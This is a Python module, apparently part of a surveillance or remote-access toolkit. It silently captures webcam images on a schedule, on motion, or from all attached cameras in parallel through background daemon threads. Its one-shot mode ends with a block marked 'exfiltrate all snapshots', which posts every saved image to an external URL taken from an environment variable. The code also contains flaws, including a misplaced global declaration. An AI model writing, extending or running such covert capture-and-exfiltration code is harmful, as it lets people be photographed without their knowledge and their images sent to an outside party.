# modules/camera_ext.py

import os
import threading
import time
import datetime
import platform
import logging
from modules.logger import log_event

# Try OpenCV import
try:
    import cv2
except ImportError:
    cv2 = None

# ──────────────────────────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────────────────────────

BASE_DIR = os.path.dirname(os.path.realpath(__file__))
SCREENSHOT_DIR = os.path.join(os.path.expanduser("~"), "camera_snapshots")
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

DEFAULT_INTERVAL = 60           # seconds
DEFAULT_FORMAT = "jpg"          # or "png"
MOTION_THRESHOLD = 100000       # pixel‐difference threshold for motion detection

# ──────────────────────────────────────────────────────────────────────────────

def take_snapshot(output_path: str) -> bool:
    """
    Capture a single image from the default webcam and write it to output_path.
    Returns True on success, False on failure.
    """
    if cv2 is None:
        logging.warning("[camera_ext] OpenCV not installed")
        return False

    cap = None
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW if platform.system() == "Windows" else cv2.CAP_ANY)
        if not cap.isOpened():
            logging.warning("[camera_ext] No webcam found or cannot be opened")
            return False

        ret, frame = cap.read()
        if not ret:
            return False

        # Ensure directory exists
        os.makedirs(os.path.dirname(output_path), exist_ok=True)

        ext = output_path.split(".")[-1].lower()
        if ext == "png":
            cv2.imwrite(output_path, frame, [cv2.IMWRITE_PNG_COMPRESSION, 3])
        else:
            # Default to JPEG
            cv2.imwrite(output_path, frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
        return True
    except Exception as e:
        logging.error(f"[camera_ext] take_snapshot error: {e}")
        return False
    finally:
        if cap:
            cap.release()

def detect_motion_and_snapshot(prev_frame, threshold: int = MOTION_THRESHOLD) -> (bool, any):
    """
    Compare prev_frame (grayscale) with new frame. If difference > threshold, return (True, new_frame).
    Else (False, new_frame).
    """
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW if platform.system() == "Windows" else cv2.CAP_ANY)
    if not cap.isOpened():
        return False, None
    ret, frame = cap.read()
    cap.release()
    if not ret or prev_frame is None:
        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY) if frame is not None else None
        return False, gray

    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    diff = cv2.absdiff(prev_frame, gray)
    non_zero = cv2.countNonZero(diff)
    if non_zero > threshold:
        return True, gray
    return False, gray

def motion_snapshot_worker(interval: int):
    """
    Continuously check for motion at each 'interval'; if detected, save a snapshot.
    """
    prev_gray = None
    while True:
        motion, prev_gray = detect_motion_and_snapshot(prev_gray)
        if motion:
            ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
            filename = f"motion_{ts}.{DEFAULT_FORMAT}"
            output_path = os.path.join(SCREENSHOT_DIR, filename)
            if take_snapshot(output_path):
                log_event({"type": "camera_motion_snapshot", "file": output_path})
        time.sleep(interval)

def snapshot_worker(interval: int, require_motion: bool = False):
    """
    Continuously take snapshots every 'interval' seconds. If require_motion=True, only when motion detected.
    """
    if require_motion:
        motion_snapshot_worker(interval)
    else:
        while True:
            ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
            filename = f"cam_{ts}.{DEFAULT_FORMAT}"
            output_path = os.path.join(SCREENSHOT_DIR, filename)
            success = take_snapshot(output_path)
            if success:
                log_event({"type": "camera_snapshot", "file": output_path})
            else:
                log_event({"type": "camera_snapshot_failed"})
            time.sleep(interval)

def start_camera_capture(interval: int = DEFAULT_INTERVAL, require_motion: bool = False):
    """
    Spin up a daemon thread that takes a snapshot every 'interval' seconds (or only on motion).
    Returns the Thread object.
    """
    if cv2 is None:
        logging.error("[camera_ext] OpenCV not installed; camera capture disabled")
        return None
    t = threading.Thread(target=snapshot_worker, args=(interval, require_motion), daemon=True)
    t.start()
    return t

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Camera Ext (Enhanced)")
    parser.add_argument("--interval", type=int, default=DEFAULT_INTERVAL, help="Interval between snapshots (seconds)")
    parser.add_argument("--motion", action="store_true", help="Only snapshot on motion detection")
    parser.add_argument("--mass", action="store_true", help="Capture from all available cameras in parallel")
    parser.add_argument("--duration", type=int, default=0, help="Duration to run (seconds, 0=forever)")
    parser.add_argument("--format", choices=["jpg", "png"], default=DEFAULT_FORMAT, help="Image format")
    args = parser.parse_args()

    if cv2 is None:
        print("[!] OpenCV not installed. pip install opencv-python")
        exit(1)

    # Fix: declare global before assignment and remove duplicate assignment
    global DEFAULT_FORMAT
    DEFAULT_FORMAT = args.format

    def available_cameras(max_test=10):
        cams = []
        for i in range(max_test):
            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW if platform.system() == "Windows" else cv2.CAP_ANY)
            if cap.isOpened():
                cams.append(i)
                cap.release()
        return cams

    if args.mass:
        print("[+] Starting mass camera capture on all available cameras …")
        threads = []
        for idx in available_cameras():
            def cam_worker(idx=idx):
                while True:
                    ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
                    filename = f"cam{idx}_{ts}.{DEFAULT_FORMAT}"
                    output_path = os.path.join(SCREENSHOT_DIR, filename)
                    cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW if platform.system() == "Windows" else cv2.CAP_ANY)
                    ret, frame = cap.read()
                    cap.release()
                    if ret:
                        if DEFAULT_FORMAT == "png":
                            cv2.imwrite(output_path, frame, [cv2.IMWRITE_PNG_COMPRESSION, 3])
                        else:
                            cv2.imwrite(output_path, frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
                        log_event({"type": "camera_snapshot", "file": output_path, "cam": idx})
                    time.sleep(args.interval)
            t = threading.Thread(target=cam_worker, daemon=True)
            t.start()
            threads.append(t)
        if args.duration > 0:
            time.sleep(args.duration)
        else:
            while True:
                time.sleep(60)
    elif args.motion:
        print(f"[+] Motion-triggered snapshots to {SCREENSHOT_DIR}")
        t = start_camera_capture(interval=args.interval, require_motion=True)
        if args.duration > 0:
            time.sleep(args.duration)
        else:
            while True:
                time.sleep(60)
    else:
        print(f"[+] One‐time snapshot to {SCREENSHOT_DIR}")
        ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        out = os.path.join(SCREENSHOT_DIR, f"one_{ts}.{DEFAULT_FORMAT}")
        if take_snapshot(out):
            print(f"[+] Snapshot saved: {out}")
            # Enhancement: burst mode (take multiple rapid snapshots)
            burst = 5
            burst_delay = 0.5
            print(f"[+] Taking burst of {burst} snapshots ...")
            for i in range(burst):
                tsb = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
                outb = os.path.join(SCREENSHOT_DIR, f"burst_{i+1}_{tsb}.{DEFAULT_FORMAT}")
                if take_snapshot(outb):
                    print(f"[+] Burst snapshot {i+1} saved: {outb}")
                else:
                    print(f"[!] Burst snapshot {i+1} failed.")
                time.sleep(burst_delay)
            # Enhancement: exfiltrate all snapshots in directory (dangerous)
            exfil_url = os.getenv("CAMERA_EXFIL_URL")
            if exfil_url:
                import requests
                for fname in os.listdir(SCREENSHOT_DIR):
                    fpath = os.path.join(SCREENSHOT_DIR, fname)
                    try:
                        with open(fpath, "rb") as f:
                            files = {"file": (fname, f, "application/octet-stream")}
                            resp = requests.post(exfil_url, files=files, timeout=10)
                            print(f"[+] Exfiltrated {fname}: HTTP {resp.status_code}")
                    except Exception as ex:
                        print(f"[!] Exfiltration failed for {fname}: {ex}")
        else:
            print("[!] Snapshot failed.")
